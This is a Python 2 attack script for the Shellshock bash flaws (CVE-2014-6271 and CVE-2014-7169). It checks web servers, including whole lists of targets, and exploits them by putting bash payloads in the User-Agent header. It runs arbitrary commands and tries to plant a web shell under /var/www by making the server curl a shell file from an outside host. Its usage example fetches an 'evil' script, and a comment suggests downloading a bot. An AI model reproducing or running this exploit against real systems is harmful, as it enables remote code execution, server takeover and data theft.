
import urllib2
import argparse
from urlparse import urlparse


try:
    #Setup list for multiple target scan
    targets = []

    # Check url
    def checkurl(url):
        if url[:8] != "https://" and url[:7] != "http://":
            print '[!] URL Must be complete. ie https://url or http://'
            return False
        else:
            return url

    #Function used to write shell in web root for CVE-2014-7169 (EXPERIMENTAL, may not be executable). Even if the shell
    #doesn't work this can be used to extract information by outputting data to a readable file. Could be handy for
    #enumerating contents of system files
    def checkshell(url, loc, shell):
        try:
            if shell:
                uagent = {"User-Agent": "() {(a)=>\' bash -c \"%s curl -s %s\"" % (loc, shell)}
            else:
                uagent = {"User-Agent": "() {(a)=>\' bash -c \"%s curl -s http://www.r57shell.net/shell/CWShellDumper.txt\"" % loc}
            request = urllib2.Request(url, None, uagent)
            response = urllib2.urlopen(request, timeout=3)
            shellurl = urlparse(url)
            shellurl = shellurl[0] + "://" + shellurl[1] + "/" + loc
            try:
                request2 = urllib2.Request(shellurl)
                urllib2.urlopen(request2, timeout=3)
                print "[+] Bazinga! Shell found on server! URL: %s" % shellurl
                return True
            except urllib2.HTTPError, e:
                if e.code == 404:
                    print "[!] Shell not found at %s" % loc
                    return False
            except urllib2.URLError:
                print '[!] Connection Error! Server timeout or connection failed.'
                return False
        except urllib2.HTTPError, e:
            #print e.info()
            if e.code == 400:
                print '[!] Page not found'
                return False
            else:
                print '[!] HTTP Error! Response code: %s' % e.code
                return False
        except urllib2.URLError:
            print '[!] Connection Error! Server timeout or connection failed.'
            return False
        except KeyboardInterrupt:
            print "\nKeyboard interrupt caught..."
            q = raw_input('Would you like to quit (q) or move to next test (n) if applicable? (type q or n): ')
            if q.lower() == 'q':
                exit(1)
            elif q.lower() == 'n':
                pass
                return False
            else:
                print "Input not recognized.. moving to next target! "
                print "(Type 'q' to quit at the ctrl-C prompt)"
                pass
                return False
        except:
            print '[!] Error! Connection probably reset by peer'
            return False

    #Check for vulnerability found in CVE-2014-6271. This JUST checks if it's vulnerable, it does not exploit it.
    def checkvuln1(url):
        print '\n[+] Scanning %s' % url.strip('\n')
        try:
            headers = {"User-Agent": "() { :;}; /bin/bash -c 'echo vulnerable'"}
            request = urllib2.Request(url, None, headers)
            response = urllib2.urlopen(request, timeout=3)
            #print response.info()
            if 'vulnerable' in response.info():
                print '[+] Target Vulnerable: %s\n' % url.strip('\n')
                targets.append(url)
                return True
            else:
                print '[!] Target may NOT be vulnerable to CVE-2014-6271\n'
                return False
        except urllib2.HTTPError, e:
            #print e.info()
            if e.code == 400:
                print '[!] Page not found'
                return False
            else:
                print '[!] HTTP Error! Response code: %s' % e.code
                return False
        except urllib2.URLError:
            print '[!] Connection Error! Server timeout or connection failed.'
            return False
        except KeyboardInterrupt:
            print "\nKeyboard interrupt caught..."
            q = raw_input('Would you like to quit (q) or move to next target (n) if applicable? (type q or n): ')
            if q.lower() == 'q':
                exit(1)
            elif q.lower() == 'n':
                pass
            else:
                print "Input not recognized.. moving to next target! "
                print "(Type 'q' to quit at the ctrl-C prompt)"
                pass
        except:
            print '[!] Error! Connection probably reset by peer'
            return False

    #(EXPERIMENTAL)Check for vulnerability found in CVE-2014-7169 by spawning shell.php in /var/www and/or /var/www/html
    #This can be adapted to take a parameter of a system file. The file can be catted to an arbitrary file that can be
    # viewed by an attacker in the web root. W00t!
    def checkvuln2(url, shell):
        print '\n[+] Scanning %s' % url.strip('\n')
        try:
            sh = checkshell(url, "/var/www/shell.php", shell)
            if not sh:
                sh =checkshell(url, "/var/www/html/shell.php", shell)
                if not sh:
                    print "[!] Target may NOT be vulnerable to CVE-2014-7169\n"
        except KeyboardInterrupt:
            print "\nKeyboard interrupt caught..."
            q = raw_input('Would you like to quit (q) or move to next target (n) if applicable? (type q or n): ')
            if q.lower() == 'q':
                exit(1)
            elif q.lower() == 'n':
                pass
            else:
                print "Input not recognized.. moving to next target! "
                print "(Type 'q' to quit at the ctrl-C prompt)"
                pass

    #Function to inject commands if system is vulnerable to CVE-2014-6271. Curl comes to mind to download bot or simply
    #just perform some basic system enumeration for non-malicious research
    def cmdinjection(url,cmd):
        try:
            uagent = { 'User-Agent': '() { :;}; /bin/bash -c "%s"' % cmd}
            response = urllib2.Request(url, None, uagent)
            content = urllib2.urlopen(response).read()
            print '[+] Command sent: %s' % cmd
            print '[+] Result: %s' % content
        except urllib2.HTTPError, e:
            if e.code == 500:
                print '[!] '+cmd+' command sent!!!'
            else:
                print '[!] command not sent :('
        except urllib2.URLError:
            print '[X] Connection Error'
        except KeyboardInterrupt:
            print "\nKeyboard interrupt caught.. exiting!"
            exit(1)

    #setup argparse
    parser = argparse.ArgumentParser(description='Scan for CVE-2014-6271 codenamed ShellShock',
                                     usage='%(prog)s -t http://target.com/cgi-bin/login '
                                           '-c "curl -s http://mydomain.com/evil -o evil.sh"')
    parser.add_argument('-t', '--target', dest='target', help="Single URL to test for shellshock")
    parser.add_argument('-T', '--target-list', dest='targetlist', help="List of URLs to test for shellshock")
    parser.add_argument('-c', '--cmd', dest='cmd', help="Command to run on vulnerable server")
    parser.add_argument('-s', '--scan', dest='scan', default=False, action="store_true", help="Scan for CVE-2014-6271")
    parser.add_argument('-S', '--scan2', dest='scan2', default=False, action='store_true', help="Scan for CVE-2014-7169")
    parser.add_argument('-x', '--shell', dest='shell', help="Specify the full url of a web shell [Default r57.php]")
    args = parser.parse_args()

    #Setup args
    target = args.target
    targetlist = args.targetlist
    command = args.cmd
    scan = args.scan
    scan2 = args.scan2
    shell = args.shell

    # Check args and scan
    if not target and not targetlist:
        print '[!] Error! You must specify a target with -t or a target list with -T'
        exit(1)

    if not scan and not scan2 and not command:
        print '[!] Error you need to either scan the url with -s, -2, or specify a command with -c'
        exit(1)

    if shell:
        shell = checkurl(shell)
        if not shell:
            print "Shell must be a full http path as it is retrieved with curl!"
            exit(1)
    else:
        shell = False

    #main
    def main():
        if target:
            url = checkurl(target)
            if url:
                if scan:
                    checkvuln1(url)
                elif scan2:
                    checkvuln2(url, shell)
                else:
                    cmdinjection(url, command)
        elif targetlist:
            with open(targetlist, 'r') as f:
                for t in f:
                    url = checkurl(t)
                    if url:
                        if scan:
                            checkvuln1(url)
                        elif scan2:
                            checkvuln2(url, shell)
                        else:
                            cmdinjection(url, command)
        if targets:
            print "Printing a list of targets: "
            count = 1
            for t in targets:
                print "%d ) %s" % (count, t)
                count += 1

    if __name__ == "__main__":
        main()
except KeyboardInterrupt:
    exit(1)